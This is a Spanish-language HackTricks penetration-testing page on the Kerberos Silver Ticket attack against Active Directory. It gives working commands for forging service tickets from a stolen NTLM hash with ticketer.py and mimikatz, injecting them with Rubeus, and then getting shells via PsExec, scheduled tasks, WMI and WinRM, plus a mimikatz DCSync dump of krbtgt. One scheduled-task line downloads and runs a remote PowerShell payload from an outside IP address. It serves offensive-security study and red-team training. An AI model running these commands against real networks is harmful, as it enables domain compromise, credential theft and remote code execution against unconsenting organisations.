# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **regístrate** en **Intigriti**, una plataforma de **bug bounty premium creada por hackers, para hackers**! Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

El ataque de **Silver Ticket** implica la explotación de tickets de servicio en entornos de Active Directory (AD). Este método se basa en **adquirir el hash NTLM de una cuenta de servicio**, como una cuenta de computadora, para falsificar un ticket de Servicio de Concesión de Tickets (TGS). Con este ticket falsificado, un atacante puede acceder a servicios específicos en la red, **suplantando a cualquier usuario**, generalmente con el objetivo de obtener privilegios administrativos. Se enfatiza que el uso de claves AES para falsificar tickets es más seguro y menos detectable.

Para la creación de tickets, se emplean diferentes herramientas según el sistema operativo:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### En Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
El servicio CIFS se destaca como un objetivo común para acceder al sistema de archivos de la víctima, pero otros servicios como HOST y RPCSS también pueden ser explotados para tareas y consultas WMI.

## Servicios Disponibles

| Tipo de Servicio                           | Servicios Silver Tickets                                                  |
| ------------------------------------------ | ------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                 |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependiendo del SO también:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>En algunas ocasiones solo puedes pedir: WINRM</p> |
| Tareas Programadas                         | HOST                                                                    |
| Compartición de Archivos de Windows, también psexec | CIFS                                                                    |
| Operaciones LDAP, incluido DCSync         | LDAP                                                                    |
| Herramientas de Administración de Servidores Remotos de Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                      |
| Golden Tickets                             | krbtgt                                                                |

Usando **Rubeus** puedes **pedir todos** estos tickets usando el parámetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### IDs de Evento de Silver Tickets

- 4624: Inicio de Sesión de Cuenta
- 4634: Cierre de Sesión de Cuenta
- 4672: Inicio de Sesión de Administrador

## Abusando de los Tickets de Servicio

En los siguientes ejemplos imaginemos que el ticket se recupera suplantando la cuenta de administrador.

### CIFS

Con este ticket podrás acceder a la carpeta `C$` y `ADMIN$` a través de **SMB** (si están expuestas) y copiar archivos a una parte del sistema de archivos remoto simplemente haciendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
También podrás obtener un shell dentro del host o ejecutar comandos arbitrarios usando **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Con este permiso puedes generar tareas programadas en computadoras remotas y ejecutar comandos arbitrarios:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Con estos tickets puedes **ejecutar WMI en el sistema de la víctima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encuentra **más información sobre wmiexec** en la siguiente página:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Con acceso winrm a una computadora, puedes **acceder a ella** e incluso obtener un PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulta la siguiente página para aprender **más formas de conectarte con un host remoto usando winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Ten en cuenta que **winrm debe estar activo y escuchando** en la computadora remota para acceder a ella.

### LDAP

Con este privilegio puedes volcar la base de datos del DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Aprende más sobre DCSync** en la siguiente página:

## Referencias

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Consejo de bug bounty**: **regístrate** en **Intigriti**, una **plataforma de bug bounty premium creada por hackers, para hackers**! Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
